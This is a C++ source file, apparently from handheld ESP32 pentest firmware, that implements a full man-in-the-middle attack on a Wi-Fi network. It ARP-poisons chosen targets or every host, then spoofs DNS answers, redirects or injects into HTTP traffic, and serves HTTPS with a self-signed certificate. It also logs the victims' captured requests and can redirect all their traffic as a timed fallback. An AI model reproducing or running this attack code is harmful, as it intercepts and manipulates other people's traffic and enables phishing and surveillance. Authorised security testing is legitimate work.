 * `info` reports the link the attack is running on (SSID, channel, board IP and
 * the gateway with its MAC) and `probe` resolves hosts through ARP, so a
 * payload can say what it is actually facing - a router, a phone, a printer -
 * instead of assuming. Read-only: no ARP pair starts and no rule changes, so
 * this cannot interfere with the lines that follow it.
 *
 * Runs after the pairs are up so a `probe all` can read the list the pairing
 * scan already built; a single-target run scans only when the list is empty.
 */
static void mitmRunRecon(const MitmScriptResult &r) {
    if (r.wantInfo) {
        bool linked = WiFi.isConnected();
        mitmLogAdd(
            String("info ") + (linked ? WiFi.SSID() : String("no network")) + " ch" +
            String(linked ? WiFi.channel() : 0) + " ip " + (linked ? WiFi.localIP().toString() : String("-"))
        );
        IPAddress gw;
        uint8_t gwMac[6];
        if (netspoof_gateway_info(gw, gwMac)) {
            mitmLogAdd(String("info gateway ") + gw.toString() + " " + mitmMacLabel(gwMac));
        } else {
            mitmLogAdd("info gateway unknown (ARP table empty)");
        }
    }

    for (int i = 0; i < r.probeCount; i++) {
        String spec = r.probes[i];
        if (spec.equalsIgnoreCase("all")) {
            String err;
            if (netspoof_target_count() == 0) netspoof_scan_targets(MITM_PROBE_SCAN_MS, err);
            int n = netspoof_target_count();
            if (n == 0) {
                mitmLogAdd("probe all: no host answered ARP");
                continue;
            }
            for (int k = 0; k < n && k < MITM_PROBE_LINES; k++) {
                const NetSpoofTarget *t = netspoof_target(k);
                if (!t) continue;
                mitmLogAdd(String("probe ") + t->ip.toString() + " " + t->macStr + (t->gateway ? " gw" : ""));
            }
            if (n > MITM_PROBE_LINES) mitmLogAdd(String("probe all: ") + String(n) + " host(s) total");
            continue;
        }
        IPAddress ip;
        if (!ip.fromString(spec.c_str())) {
            mitmLogAdd("probe " + spec + " bad address");
            continue;
        }
        uint8_t mac[6];
        if (netspoof_resolve_mac(ip, mac, 1500)) mitmLogAdd(String("probe ") + ip.toString() + " " + mitmMacLabel(mac));
        else mitmLogAdd(String("probe ") + ip.toString() + " no answer");
    }
}

/// Arm one fallback step after the previous methods produced nothing.
static void mitmApplyFallback(const MitmFallbackStep &step, String &state) {
    String err;
    if (step.dns) {
        // The page never fired: answer the victim's lookups instead, so its next
        // request is pointed at a name we control.
        if (netspoof_dns_add_rule("*", step.value, true, err) && netspoof_dns_start(err)) {
            state = String("dns ") + step.value;
            // While HTTPS is up, A records are pinned to the board, so a DNS
            // fallback can no longer move the victim elsewhere. Say so rather
            // than pretending the rule took effect.
            mitmLogAdd(
                String("no hit yet - answering DNS with ") + step.value +
                (netspoof_https_active() ? String(" (HTTPS stays on board)") : String())
            );
        } else {
            state = "failed";
            mitmLogAdd(String("fallback dns failed: ") + (err.length() ? err : String("engine")));
        }
    } else {
        if (netspoof_http_add_redirect("*", step.value, true, err) && netspoof_http_start(err)) {
            state = String("302 ") + step.value;
            mitmLogAdd(String("no hit yet - 302 everything to ") + step.value);
        } else {
            state = "failed";
            mitmLogAdd(String("fallback 302 failed: ") + (err.length() ? err : String("engine")));
        }
    }
}

/// The live run screen: one opaque box in the middle of the panel holding the
/// whole status feed.
///
/// The feed used to be drawn straight onto the screen between two header rows,
/// so its lines ran across whatever the menu underneath had left there and the
/// panel read as text scattered over the GUI. Now a cleared, bordered box owns
/// the middle of the screen: the link line is its header, the log is its body,
/// and the one hint sits in the strip below it. Nothing is painted outside the
/// box except the title, so no GUI element can ever show through the log.
///
/// The body uses the small font (FP): 49 characters per line and 8 px rows fit
/// the ten buffered lines exactly, which is what a terminal tail should look
/// like on a 320x170 panel.
static void mitmDrawRun(int pairs, const String &fallbackState, uint32_t hits) {
    drawMainBorderWithTitle("MITM RUN");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    const int boxX = 6;
    const int boxW = tftWidth - 12;
    const int boxY = BORDER_PAD_Y + FM * LH + 4;  // just under the title
    const int boxH = tftHeight - boxY - 16;       // strip left for the hint

    // Opaque first: this is what hides the menu the attack was started from.
    tft.fillRoundRect(boxX, boxY, boxW, boxH, 4, bruceConfig.bgColor);
    tft.drawRoundRect(boxX, boxY, boxW, boxH, 4, bruceConfig.priColor);

    // Header: network, target, pairs and hits on one line at normal size.
    String ssid = WiFi.isConnected() ? WiFi.SSID() : String("no network");
    if (ssid.length() > 11) ssid = ssid.substring(0, 11);
    String tgt = mitmTargetLabel();
    if (tgt.length() > 10) tgt = tgt.substring(0, 10);
    String head = ssid + " " + tgt + " p" + String(pairs) + " h" + String(hits);
    if (head.length() > 24) head = head.substring(0, 24);
    tft.setTextSize(FM);
    tft.drawString(head, boxX + 6, boxY + 4);

    tft.drawLine(boxX + 4, boxY + 21, boxX + boxW - 5, boxY + 21, bruceConfig.priColor);

    // Terminal-style feed: the newest event sits on the bottom line, the way a
    // tail of a log file reads. The old counter table said "http 0/0", which
    // looked identical whether nobody visited or the attack was broken; these
    // lines say who did what.
    const int lineH = FP * LH;
    const int firstY = boxY + 24;
    int rows = (boxY + boxH - 4 - firstY) / lineH;
    if (rows > mitmLogUsed) rows = mitmLogUsed;
    if (rows > MITM_LOG_LINES) rows = MITM_LOG_LINES;
    if (rows > 0) {
        int first = MITM_LOG_LINES - rows;
        int y = boxY + boxH - 4 - rows * lineH; // bottom-aligned: tail of a log
        tft.setTextSize(FP);
        for (int i = 0; i < rows; i++) {
            String line = mitmLogLine[first + i];
            if (line.length() > 49) line = line.substring(0, 49);
            tft.drawString(line, boxX + 4, y);
            y += lineH;
        }
    }

    // The one hint, in the strip under the box so it never eats a log row.
    String hint = "next:" + (fallbackState.length() ? fallbackState : String("none")) + "  BACK=stop";
    if (hint.length() > 49) hint = hint.substring(0, 49);
    tft.setTextSize(FP);
    tft.drawString(hint, boxX + 2, tftHeight - 14);
}

/**
 * @brief Arm one payload, run it, then put everything back.
 *
 * @param durationMs 0 = until BACK; otherwise the headless deadline
 * @param draw       paint the run screen (false for the console verb/tests)
 * @return "" when the run completed, otherwise an "err: ..." line
 */
static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
    if (!mitmEnsureStation()) return "err: connect to WiFi first";
    if (path.length() == 0) return "err: pick a payload first";

    MitmScriptResult r = mitmPayloadLoadScript(path);
    if (!r.ok) return "err: " + (r.error.length() ? r.error : String("payload has no rules"));

    String err;
    mitmLogClear();
    mitmRunStart = millis();
    if (draw) {
        drawMainBorderWithTitle("MITM RUN");
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.drawString("Poisoning targets...", 10, 50);
    }

    // Say what the board is working with before touching anyone: the network it
    // joined and what it can do on it.
    wifi_auth_mode_t auth = WiFi.isConnected() ? mitmCurrentAuth() : WIFI_AUTH_OPEN;
    mitmLogAdd(
        String("attack started against ") + (WiFi.isConnected() ? WiFi.SSID() : String("no network"))
    );
    mitmLogAdd(String(mitmAuthName(auth)) + " - HTTP all ports + HTTPS (cert warning)");
    mitmLogAdd(
        String("payload: ") + String(r.pages) + " page " + String(r.redirects) + " redir " + String(r.dns) + " dns"
    );

    int pairs = mitmPairTargets(r.target, err);
    if (pairs == 0) return "err: " + (err.length() ? err : String("no ARP pair"));
    for (int i = 0; i < netspoof_arp_pair_count(); i++) {
        IPAddress victim, gw;
        char tMac[18], gMac[18];
        if (netspoof_arp_pair_info(i, victim, gw, tMac, gMac)) {
            mitmLogAdd(String("poisoning ") + victim.toString() + " <-> " + gw.toString());
        }
    }
    if (pairs > netspoof_arp_pair_count()) mitmLogAdd(String("poisoning ") + String(pairs) + " device(s)");

    // Reconnaissance lines (`info`, `probe`) come after the pairs so `probe all`
    // can reuse the scan that just ran, and before the engines so the feed shows
    // what the run is facing before the first request is answered.
    mitmRunRecon(r);

    // Transparent forwarding: the payload asks for the bridge and declares what
    // to serve if the board cannot provide it. This is the capability check the
    // `.mitm` format allows - `forward auto` + `offline page` means "redirect to
    // the real target when the victim keeps internet, otherwise the offline
    // page", decided at start from what the engine can actually do.
    bool forwarding = false;
    if (r.forward != 0) {
        String ferr;
        forwarding = netspoof_forward_start(ferr);
        if (forwarding) {
            mitmLogAdd("forwarding on - targets keep internet");
        } else {
            mitmLogAdd(String("forwarding failed: ") + (ferr.length() ? ferr : String("no gateway")));
            if (r.offlinePage.length()) {
                // No internet path exists without the bridge, so a redirect to a
                // real host could never load: serve the page locally instead.
                netspoof_http_clear_redirects();
                MitmPayloadResult html = mitmPayloadLoadHtml(r.offlinePage, "*");
                if (html.ok) mitmLogAdd(String("offline page: ") + r.offlinePage);
                else mitmLogAdd("offline page failed: " + html.error);
            }
        }
    }

    if (r.dns > 0 && !netspoof_dns_start(err)) mitmLogAdd(String("dns engine failed: ") + err);
    if ((r.pages + r.redirects) > 0 && !netspoof_http_start(err)) mitmLogAdd(String("http engine failed: ") + err);
    if (!netspoof_dns_active() && !netspoof_http_active()) {
        String why = err.length() ? err : String("engine did not start");
        String ignored;
        if (netspoof_forward_active()) netspoof_forward_stop();
        netspoof_arp_stop(ignored);
        return "err: " + why;
    }
    if (netspoof_https_active()) {
        mitmLogAdd("https :443 up (self-signed, warning expected)");
    }
    if (netspoof_http_active())
        mitmLogAdd(r.redirects ? "waiting for HTTP/HTTPS requests (302)" : "waiting for HTTP/HTTPS requests (page)");
    else mitmLogAdd("waiting for DNS queries");

    uint32_t started = millis();
    uint32_t lastDraw = 0, lastPrint = 0;
    netspoof_capture_clear();
    uint32_t lastCaptureTotal = netspoof_capture_total();
    int fallbackNext = 0;
    String fallbackState = r.fallbackCount > 0 ? String("armed") : String("none");

    while (true) {
        if (durationMs == 0 && check(EscPress)) break;
        if (durationMs > 0 && (millis() - started) >= durationMs) break;

        uint32_t now = millis();
        uint32_t hits = netspoof_http_injected() + netspoof_http_redirected() + netspoof_https_injected() +
                        netspoof_https_redirected();

        // Fallbacks are a timetable: each line fires at its own time from the
        // start, and only while the attack has not produced a single hit, so a
        // fallback can never override a rule that is already working. Several
        // steps whose deadline already passed fire in the same pass.
        while (fallbackNext < r.fallbackCount && hits == 0 &&
               (now - started) >= r.fallbacks[fallbackNext].afterMs) {
            mitmApplyFallback(r.fallbacks[fallbackNext], fallbackState);
            fallbackNext++;
        }
        if (fallbackNext >= r.fallbackCount && fallbackState == "armed") fallbackState = "spent";

        // Feed every new capture into the activity log. The ring is small and
        // DNS traffic can push HTTP out between two polls, so the log is drained
        // every pass and never reconstructs state from timestamps.
        mitmLogCaptures(lastCaptureTotal);

        if (now - lastPrint >= 5000) {
            lastPrint = now;
            Serial.printf(
                "[MITM] t+%lus pairs=%d frames=%lu dns=%lu/%lu http=%lu/%lu https=%lu/%lu fallback=%s\n",
                (unsigned long)((now - started) / 1000), netspoof_arp_pair_count(), (unsigned long)netspoof_arp_frames(),
                (unsigned long)netspoof_dns_answers(), (unsigned long)netspoof_dns_queries(),
                (unsigned long)netspoof_http_injected(), (unsigned long)netspoof_http_requests(),
                (unsigned long)netspoof_https_injected(), (unsigned long)netspoof_https_requests(), fallbackState.c_str()
            );
        }
        if (draw && now - lastDraw >= 250) {
            lastDraw = now;
            mitmDrawRun(netspoof_arp_pair_count(), fallbackState, hits);
        }
        vTaskDelay(pdMS_TO_TICKS(25));
    }

    mitmLogCaptures(lastCaptureTotal);
    mitmLogAdd(
        String("stopping - ") +
        String(
            netspoof_http_injected() + netspoof_http_redirected() + netspoof_https_injected() +
            netspoof_https_redirected()
        ) +
        " hit(s), restoring ARP"
    );

    // Stop the responders first, restore ARP last: the victim keeps sending its
    // gateway traffic here until the two mappings are put back.
    String e0, e1, e2, e3;
    if (forwarding || netspoof_forward_active()) netspoof_forward_stop();
    if (netspoof_https_active()) netspoof_https_stop(e0);
    if (netspoof_http_active()) netspoof_http_stop(e1);
    if (netspoof_dns_active()) netspoof_dns_stop(e2);
    if (netspoof_arp_active()) netspoof_arp_stop(e3);

    mitmClearKeys();
    String summary = String("pairs ") + String(pairs) + " dns " + String(netspoof_dns_answers()) + "/" +
                     String(netspoof_dns_queries()) + " http " + String(netspoof_http_injected()) + "/" +
                     String(netspoof_http_requests()) + " https " + String(netspoof_https_injected()) + "/" +
                     String(netspoof_https_requests());
    Serial.printf(
        "[MITM] stop pairs=%d requests=%lu redirected=%lu injected=%lu https=%lu/%lu/%lu dnsQ=%lu dnsA=%lu\n",
        netspoof_arp_pair_count(),
        (unsigned long)netspoof_http_requests(), (unsigned long)netspoof_http_redirected(),
        (unsigned long)netspoof_http_injected(), (unsigned long)netspoof_https_requests(),
        (unsigned long)netspoof_https_redirected(), (unsigned long)netspoof_https_injected(),
        (unsigned long)netspoof_dns_queries(), (unsigned long)netspoof_dns_answers()
    );
    return summary;
}

static void mitmRunAttack() {
    String s = mitmRunCore(mitmScriptPath, 0, true);
    if (s.startsWith("err:")) {
        // There is no "Last:" row on the page any more, so report the reason
        // where it cannot be missed.
        String why = s.substring(5);
        why.trim();
        displayError(why.length() ? why : String("attack failed"), true);
        return;
    }
    (void)s;
}

bool mitmAttackSetTarget(const String &spec) {
    String who = spec;
    who.trim();
    if (who.equalsIgnoreCase("all")) {
        mitmSetTargetAll();
        return true;
    }
    IPAddress ip;
    if (!ip.fromString(who.c_str())) return false;
    mitmSetTargetOne(ip, nullptr);
    return true;
}

String mitmAttackPayloadPath() { return mitmScriptPath; }

void mitmAttackSetPayload(const String &path) { mitmScriptPath = path; }

String mitmAttackTargetLabel() { return mitmTargetLabel(); }

bool mitmAttackRunHeadless(const String &path, uint32_t ms, String &summary, String &error) {
    String s = mitmRunCore(path, ms, false);
    if (s.startsWith("err:")) {
        error = s.substring(5);
        error.trim();
        return false;
    }
    summary = s;
    return true;
}

static void mitmShowCaptures() {
    std::vector<String> lines;
    int n = netspoof_capture_count();
    int shown = 0;
    for (int i = 0; i < n && shown < 40; i++) {
        const NetSpoofCapture *c = netspoof_capture(i);
        if (!c) continue;
        String line = c->kind == NETSPOOF_CAPTURE_DNS
                           ? String("dns ")
                           : String(c->kind == NETSPOOF_CAPTURE_HTTPS ? "https " : "") + String(c->method) + " ";
        line += String(c->host);
        if (c->path[0]) line += String(c->path);
        if (c->kind == NETSPOOF_CAPTURE_DNS) line += c->action == 1 ? "  answered" : "  seen";
        else if (c->action == 1) line += "  redirected";
        else if (c->action == 2) line += "  injected";
        else line += "  seen";
        lines.push_back(line);
        shown++;
    }
    if (shown == 0) lines.push_back("Nothing captured yet");
    mitmShowLines("MITM Captures", lines);
}

static void mitmPreviewPayload() {
    if (mitmScriptPath.length() == 0) {
        displayError("Pick a payload first", true);
        return;
    }
    MitmPayloadResult res;
    String body = mitmPayloadRead(mitmScriptPath, MITM_SCRIPT_MAX_BYTES, res);
    if (res.error.length() || body.length() == 0) {
        displayError(res.error.length() ? res.error : String("payload is empty"), true);
        return;
    }
    std::vector<String> lines;
    mitmPushWrapped(lines, body);
    if (res.truncated) lines.push_back("... truncated at " + String(MITM_SCRIPT_MAX_BYTES) + " bytes");
    mitmShowLines("Payload", lines);
}

/**
 * @brief Pick the payload file from the card and arm it.
 *
 * The Payload row is both the display and the selector, so there is no second
 * "Pick payload" entry beside it. A payload that cannot be armed says why.
 */
static void mitmPickPayload() {
    FS *fs = mitmFs();
    if (!fs) {
        displayError("No filesystem", true);
        return;
    }
    mitmEnsurePayloadDirs();
    // checkExt() compares bare extensions, a '|' separates a list.
    String path = loopSD(*fs, true, "MITM|TXT|HTML", MITM_PAYLOAD_DIR);
    if (path.length() == 0 || path == "\x1B") return;
    mitmScriptPath = path;
    MitmScriptResult r = mitmPayloadLoadScript(mitmScriptPath);
    if (!r.ok) displayError(r.error.length() ? r.error : String("payload has no rules"), true);
}

void mitmAttackMenu() {
    mitmEnsurePayloadDirs();
    // Pick the example up on first visit, the way DNS Inject did with dns.txt.
    if (mitmScriptPath.length() == 0) {
        FS *fs = mitmFs();
        if (fs && fs->exists(MITM_SCRIPT_PAYLOAD)) mitmScriptPath = MITM_SCRIPT_PAYLOAD;
    }

    int last = 0; // keep the cursor on the row that was just used
    // The page owns its rows (a local vector, not the shared global `options`):
    // every handler here opens a picker or the engine, and those used to rebuild
    // the global vector while this loop was iterating it - which is what made
    // "Network: pick one" do nothing. See mitmPickNetwork().
    std::vector<Option> rows;
AGAIN:
    rows.clear();
    // Network and Payload are the selectors: each row shows what is selected
    // and opens its picker when chosen, so there is no second row that only
    // displays the same value.
    rows.push_back({String("Network: ") + (WiFi.isConnected() ? WiFi.SSID() : String("pick one")), []() {
                        mitmPickNetwork();
                    }});
    rows.push_back({String("Target: ") + mitmTargetLabel(), []() { mitmPickTargets(); }});
    rows.push_back({String("Payload: ") + (mitmScriptPath.length() ? mitmShortPath(mitmScriptPath) : String("none")),
                    []() { mitmPickPayload(); }});
    rows.push_back({"Preview payload", []() { mitmPreviewPayload(); }});
    if (netspoof_dns_active() || netspoof_http_active() || netspoof_https_active() || netspoof_arp_active()) {
        rows.push_back({"Stop + restore", []() {
                            String err;
                            if (netspoof_https_active()) netspoof_https_stop(err);
                            if (netspoof_http_active()) netspoof_http_stop(err);
                            if (netspoof_dns_active()) netspoof_dns_stop(err);
                            if (netspoof_arp_active()) netspoof_arp_stop(err);
                        }});
    } else {
        rows.push_back({"Start attack", []() { mitmRunAttack(); }});
    }
    rows.push_back({"Captures", []() { mitmShowCaptures(); }});
    mitmMainPicked = false;
    rows.push_back({"Main Menu", []() {
                        mitmMainPicked = true;
                        backToMenu();
                    }});
    int sel = loopOptions(rows, MENU_TYPE_SUBMENU, "MITM Attack", last);
    rows.clear();
    if (sel < 0 || mitmMainPicked) {
        mitmTeardown();
        mitmClearKeys();
        return;
    }
    // Rebuilding used to pass no index, so every action threw the cursor back to
    // the top row ("the menu restarts when I toggle something").
    last = sel;
    returnToMenu = false; // the console sets this on every command; stay here
    goto AGAIN;
}
